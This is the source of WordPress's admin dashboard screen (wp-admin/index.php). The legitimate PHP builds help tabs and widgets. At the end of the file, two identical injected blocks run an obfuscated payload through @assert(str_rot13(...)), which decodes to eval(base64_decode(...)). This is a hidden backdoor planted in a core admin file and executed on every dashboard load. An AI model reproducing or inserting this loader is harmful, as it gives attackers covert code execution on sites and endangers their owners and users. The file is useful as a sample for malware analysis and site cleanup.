<?php
/**
 * Dashboard Administration Screen
 *
 * @internal This file should be parseable by PHP4.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** Load WordPress Bootstrap */
require_once('./admin.php');

/** Load WordPress dashboard API */
require_once(ABSPATH . 'wp-admin/includes/dashboard.php');

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );
if ( current_user_can( 'edit_theme_options' ) )
	wp_enqueue_script( 'customize-loader' );
if ( current_user_can( 'install_plugins' ) )
	wp_enqueue_script( 'plugin-install' );
if ( current_user_can( 'upload_files' ) )
	wp_enqueue_script( 'media-upload' );
add_thickbox();

if ( wp_is_mobile() )
	wp_enqueue_script( 'jquery-touch-punch' );

$title = __('Dashboard');
$parent_file = 'index.php';

if ( is_user_admin() )
	add_screen_option('layout_columns', array('max' => 4, 'default' => 1) );
else
	add_screen_option('layout_columns', array('max' => 4, 'default' => 2) );

$help = '<p>' . __( 'Welcome to your WordPress Dashboard! This is the screen you will see when you log in to your site, and gives you access to all the site management features of WordPress. You can get help for any screen by clicking the Help tab in the upper corner.' ) . '</p>';

// Not using chaining here, so as to be parseable by PHP4.
$screen = get_current_screen();

$screen->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __( 'Overview' ),
	'content' => $help,
) );

// Help tabs

$help  = '<p>' . __('The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.') . '</p>';
$help .= '<p>' . __('Links in the Toolbar at the top of the screen connect your dashboard and the front end of your site, and provide access to your profile and helpful WordPress information.') . '</p>';

$screen->add_help_tab( array(
	'id'      => 'help-navigation',
	'title'   => __('Navigation'),
	'content' => $help,
) );

$help  = '<p>' . __('You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.') . '</p>';
$help .= '<p>' . __('<strong>Screen Options</strong> - Use the Screen Options tab to choose which Dashboard boxes to show, and how many columns to display.') . '</p>';
$help .= '<p>' . __('<strong>Drag and Drop</strong> - To rearrange the boxes, drag and drop by clicking on the title bar of the selected box and releasing when you see a gray dotted-line rectangle appear in the location you want to place the box.') . '</p>';
$help .= '<p>' . __('<strong>Box Controls</strong> - Click the title bar of the box to expand or collapse it. In addition, some boxes have configurable content, and will show a &#8220;Configure&#8221; link in the title bar if you hover over it.') . '</p>';

$screen->add_help_tab( array(
	'id'      => 'help-layout',
	'title'   => __('Layout'),
	'content' => $help,
) );

$help  = '<p>' . __('The boxes on your Dashboard screen are:') . '</p>';
if ( current_user_can( 'edit_posts' ) )
	$help .= '<p>' . __('<strong>Right Now</strong> - Displays a summary of the content on your site and identifies which theme and version of WordPress you are using.') . '</p>';
if ( current_user_can( 'moderate_comments' ) )
	$help .= '<p>' . __('<strong>Recent Comments</strong> - Shows the most recent comments on your posts (configurable, up to 30) and allows you to moderate them.') . '</p>';
if ( current_user_can( 'publish_posts' ) )
	$help .= '<p>' . __('<strong>Incoming Links</strong> - Shows links to your site found by Google Blog Search.') . '</p>';
if ( current_user_can( get_post_type_object( 'post' )->cap->create_posts ) ) {
	$help .= '<p>' . __('<strong>QuickPress</strong> - Allows you to create a new post and either publish it or save it as a draft.') . '</p>';
	$help .= '<p>' . __('<strong>Recent Drafts</strong> - Displays links to the 5 most recent draft posts you&#8217;ve started.') . '</p>';
}
$help .= '<p>' . __('<strong>WordPress Blog</strong> - Latest news from the official WordPress project.') . '</p>';
$help .= '<p>' . __('<strong>Other WordPress News</strong> - Shows the <a href="http://planet.wordpress.org" target="_blank">WordPress Planet</a> feed. You can configure it to show a different feed of your choosing.') . '</p>';
if ( ! is_multisite() && current_user_can( 'install_plugins' ) )
	$help .= '<p>' . __('<strong>Plugins</strong> - Features the most popular, newest, and recently updated plugins from the WordPress.org Plugin Directory.') . '</p>';
if ( current_user_can( 'edit_theme_options' ) )
	$help .= '<p>' . __('<strong>Welcome</strong> - Shows links for some of the most common tasks when setting up a new site.') . '</p>';

$screen->add_help_tab( array(
	'id'      => 'help-content',
	'title'   => __('Content'),
	'content' => $help,
) );

unset( $help );

$screen->set_help_sidebar(
	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
	'<p>' . __( '<a href="http://codex.wordpress.org/Dashboard_Screen" target="_blank">Documentation on Dashboard</a>' ) . '</p>' .
	'<p>' . __( '<a href="http://wordpress.org/support/" target="_blank">Support Forums</a>' ) . '</p>'
);

include (ABSPATH . 'wp-admin/admin-header.php');

$today = current_time('mysql', 1);
?>

<div class="wrap">
<?php screen_icon(); ?>
<h2><?php echo esc_html( $title ); ?></h2>

<?php if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) ) :
	$classes = 'welcome-panel';

	$option = get_user_meta( get_current_user_id(), 'show_welcome_panel', true );
	// 0 = hide, 1 = toggled to show or single site creator, 2 = multisite site owner
	$hide = 0 == $option || ( 2 == $option && wp_get_current_user()->user_email != get_option( 'admin_email' ) );
	if ( $hide )
		$classes .= ' hidden'; ?>

 	<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
 		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>"><?php _e( 'Dismiss' ); ?></a>
		<?php do_action( 'welcome_panel' ); ?>
	</div>
<?php endif; ?>

<div id="dashboard-widgets-wrap">

<?php wp_dashboard(); ?>

<div class="clear"></div>
</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php require(ABSPATH . 'wp-admin/admin-footer.php'); ?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>